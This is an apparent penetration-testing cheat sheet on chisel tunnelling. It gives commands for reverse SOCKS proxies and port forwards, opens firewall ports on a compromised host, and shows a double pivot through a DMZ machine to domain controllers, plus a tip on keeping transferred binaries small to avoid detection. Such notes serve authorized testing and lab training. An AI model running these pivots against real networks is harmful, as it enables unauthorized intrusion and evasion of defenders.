### Reverse SOCKS Proxy
```shell
chisel server -p 1335 --reverse &
```

```shell
./chisel client 192.168.45.237:1335 R:9999:socks &
```
```powershell
Start-Job {.\chisel.exe client 192.168.45.237:1335 R:9999:socks}
Start /B chisel.exe client 10.10.14.189:443 R:9050:socks &
```

### Port Forward
```shell
.\chisel.exe client 192.168.45.237:1335 8080:127.0.0.1:80
```

### Local Port Forward
A remote port forward is when we connect back from a compromised target to create the forward.
Start chisel server on compromised host
```powershell
./chisel_windows.exe server --port 54321 --reverse --socks5

netsh advfirewall firewall add rule name="Chisel" dir=in action=allow protocol=tcp localport=15997

netsh advfirewall firewall add rule name="Chisel" dir=in action=allow protocol=tcp localport=15997
```
OR 
```bash
firewall-cmd --zone=public --add-port 15997/tcp
```
Connect to target
```shell
chisel client 192.168.194.95:54321 127.0.0.1:9999:127.0.0.1:3306
```
Everything we send to 127.0.0.1:9999 will get sent to the target on 3306

### Double Pivot
Kali -> NIX01(DMZ) -> DC01 -> DC02
- NIX01 and DC01 - 172.16.1.0/24
- DC02 - 172.16.2.0/24

On our machine
```shell
./chisel_linux server --socks5 -p 9001 --reverse
```
Edit proxychains config and comment out `socks 127.0.0.1 9050`
```shell
socks5 127.0.0.1 9999
socks5 127.0.0.1 8888
```
On NIX01
```shell
./chisel client 10.10.14.10:9001 R:9999:socks &
./chisel server  -p 9002 --reverse --socks5 &
```
On DC01
```powershell
chisel.exe client 172.16.1.100:9002 R:8888:socks
```
Scan
```bash
proxychains -q nmap -p445 -Pn -v 172.16.2.5
```

It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)" and IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)